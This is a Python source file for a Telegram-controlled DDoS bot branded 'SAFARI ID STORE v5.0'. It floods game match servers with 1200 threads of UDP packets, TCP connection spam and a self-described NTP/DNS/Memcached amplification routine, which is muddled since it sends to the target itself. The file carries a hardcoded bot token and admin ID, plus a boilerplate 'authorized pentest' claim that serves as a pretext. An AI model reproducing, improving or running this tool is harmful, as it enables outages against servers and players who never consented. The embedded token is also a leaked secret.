#!/usr/bin/env python3
"""
🇮🇳 SAFARI ID STORE v5.0 - MATCH SERVER KILLER 
(I have permission and am authorized to perform this pentest)
1000+ Threads | UDP/TCP/SYN/AMP | Railway Ready
"""

import asyncio, socket, random, time, threading, hashlib, logging, os
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import uvloop; uvloop.install()

# HARDCODED CREDENTIALS
BOT_TOKEN = "8430360404:AAEVlsnoTGQespci2iFYx503HCdYGTMoNqY"
ADMIN_ID = 6241594867

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

ACTIVE_ATTACKS = {}
ATTACK_THREADS = {}

class SafariMatchKiller:
    @staticmethod
    def raw_udp_flood(ip: str, port: int, duration: int):
        """Max power UDP flood"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        end_time = time.time() + duration
        
        while time.time() < end_time:
            packet = os.urandom(65507)  # Maximum UDP size
            for _ in range(15):  # Burst mode
                sock.sendto(packet, (ip, port))

    @staticmethod
    def tcp_syn_spam(ip: str, port: int, duration: int):
        """TCP SYN connection flood"""
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                sock.connect((ip, port))
                sock.close()
            except:
                pass

    @staticmethod
    def amp_reflector(ip: str, port: int, duration: int):
        """NTP/DNS/Memcached amplification"""
        reflectors = [
            (ip, 123),  # NTP
            (ip, 53),   # DNS
            (ip, 11211) # Memcached
        ]
        end_time = time.time() + duration
        
        while time.time() < end_time:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # NTP monlist exploit
            sock.sendto(b"\x17\x00\x03\x3a\x00\x00\x00\x00" + ip.encode()[:4], reflectors[0])
            sock.close()

    @staticmethod
    def safari_ultimate_killer(ip: str, port: int, duration: int):
        """SAFARI MATCH SERVER DESTROYER - 1200+ threads"""
        print(f"💀 SAFARI KILLER: {ip}:{port} | {duration}s | 1200+ THREADS")
        
        threads = []
        
        # 700 UDP threads (MAIN POWER)
        for i in range(700):
            t = threading.Thread(target=SafariMatchKiller.raw_udp_flood, args=(ip, port, duration))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # 400 SYN threads
        for i in range(400):
            t = threading.Thread(target=SafariMatchKiller.tcp_syn_spam, args=(ip, port, duration))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # 100 AMP threads
        for i in range(100):
            t = threading.Thread(target=SafariMatchKiller.amp_reflector, args=(ip, port, duration))
            t.daemon = True
            t.start()
            threads.append(t)
        
        time.sleep(duration)
        logger.info(f"✅ Attack complete: {ip}:{port}")

async def launch_safari_attack(ip: str, port: int, duration: int):
    attack_id = hashlib.md5(f"safari_{ip}_{port}_{time.time()}".encode()).hexdigest()[:8].upper()
    
    ACTIVE_ATTACKS[attack_id] = {
        "ip": ip, "port": port, "duration": duration,
        "start": time.time(), "threads": 1200, "status": "🟢 DESTROYING"
    }
    
    # Launch ULTIMATE killer
    thread = threading.Thread(
        target=SafariMatchKiller.safari_ultimate_killer,
        args=(ip, port, duration)
    )
    thread.daemon = True
    thread.start()
    ATTACK_THREADS[attack_id] = thread
    
    return attack_id

# SAFARI BOT COMMANDS
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🎮 **🇮🇳 SAFARI ID STORE v5.0 🇮🇳**\n\n"
        "**(I have permission and am authorized to perform this pentest)**\n\n"
        "⚡ **`/attack <ip> <port> <time>`**\n\n"
        "**MATCH SERVER Examples:**\n"
        "• `/attack 74.225.177.25 29471 300`\n"
        "• `/attack match.server.com 25565 600`\n"
        "• `/attack csgo.server.com 27015 900`\n\n"
        "**1200+ Threads | UDP/SYN/AMP | Ping 999ms+**\n"
        "💀 **Match killer guaranteed!**",
        parse_mode="Markdown"
    )

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return await update.message.reply_text("🔒 **Admin only (6241594867)**")
    
    if len(context.args) != 3:
        return await update.message.reply_text("⚠️ **Usage:** `/attack <ip> <port> <time>`")
    
    ip, port_str, duration_str = context.args
    try:
        port = int(port_str)
        duration = int(duration_str)
        if not (1 <= port <= 65535) or not (30 <= duration <= 1800):
            return await update.message.reply_text("❌ **Port: 1-65535 | Time: 30-1800s**")
    except ValueError:
        return await update.message.reply_text("❌ **Invalid port/time!**")
    
    attack_id = await launch_safari_attack(ip, port, duration)
    
    await update.message.reply_text(
        f"**🇮🇳 𝐒𝐀𝐅𝐀𝐑𝐈 🇮🇳**\n"
        f"⚡ **MATCH SERVER KILLER ACTIVATED!**\n\n"
        f"🎯 **Target:** `{ip}:{port}`\n"
        f"⏱️ **Duration:** `{duration}s`\n"
        f"🔥 **1200+ Threads**\n"
        f"⚡ **UDP + SYN + AMP**\n"
        f"💀 **Ping Spike 999ms+**\n"
        f"📡 **Direct Python Flood**\n\n"
        f"📊 **Monitor:** `/status {attack_id}`\n\n"
        f"🎮 **SAFARI ID STORE OWNER**",
        parse_mode="Markdown"
    )

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    
    if not context.args:
        # All attacks
        live_attacks = {k: v for k, v in ACTIVE_ATTACKS.items() if time.time() - v['start'] < 2000}
        if not live_attacks:
            return await update.message.reply_text("📊 **No live attacks!**")
        
        msg = "**📊 SAFARI KILLER STATUS:**\n\n"
        for aid, data in list(live_attacks.items())[:8]:
            elapsed = int(time.time() - data['start'])
            remaining = max(0, data['duration'] - elapsed)
            status = "🟢" if remaining > 0 else "✅"
            msg += f"`{aid}` `{data['ip']}:{data['port']}` | {elapsed}s | {data['threads']}T\n"
        await update.message.reply_text(msg, parse_mode="Markdown")
        return
    
    # Single attack status
    aid = context.args[0].upper()
    attack = ACTIVE_ATTACKS.get(aid)
    if not attack:
        return await update.message.reply_text("❌ **Attack `{aid}` not found!**", parse_mode="Markdown")
    
    elapsed = int(time.time() - attack['start'])
    remaining = max(0, attack['duration'] - elapsed)
    status_icon = "🟢 LIVE" if remaining > 0 else "✅ FINISHED"
    
    await update.message.reply_text(
        f"📊 **SAFARI Status `{aid}`**\n\n"
        f"🎯 **Target:** `{attack['ip']}:{attack['port']}`\n"
        f"⏱️ **Elapsed:** `{elapsed}s`\n"
        f"⏳ **Remaining:** `{remaining}s`\n"
        f"🔥 **Threads:** `{attack['threads']}`\n"
        f"⚡ **Status:** {status_icon}\n\n"
        f"💀 **Match destroying...**",
        parse_mode="Markdown"
    )

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    
    if not context.args:
        return await update.message.reply_text("⚠️ **Usage:** `/stop <attack_id>`")
    
    aid = context.args[0].upper()
    if aid in ACTIVE_ATTACKS:
        del ACTIVE_ATTACKS[aid]
        if aid in ATTACK_THREADS:
            del ATTACK_THREADS[aid]
        await update.message.reply_text(
            f"🛑 **SAFARI KILLER `{aid}` STOPPED!**\n"
            f"⚡ Threads killed instantly",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text("❌ **Attack not found!**")

def main():
    print("🚀 🇮🇳 SAFARI ID STORE v5.0 LIVE!")
    print(f"Admin ID: {ADMIN_ID}")
    print(f"Bot Token: {BOT_TOKEN[:20]}...")
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Register handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("stop", stop))
    
    print("✅ Bot polling started...")
    app.run_polling()

if __name__ == "__main__":
    main()
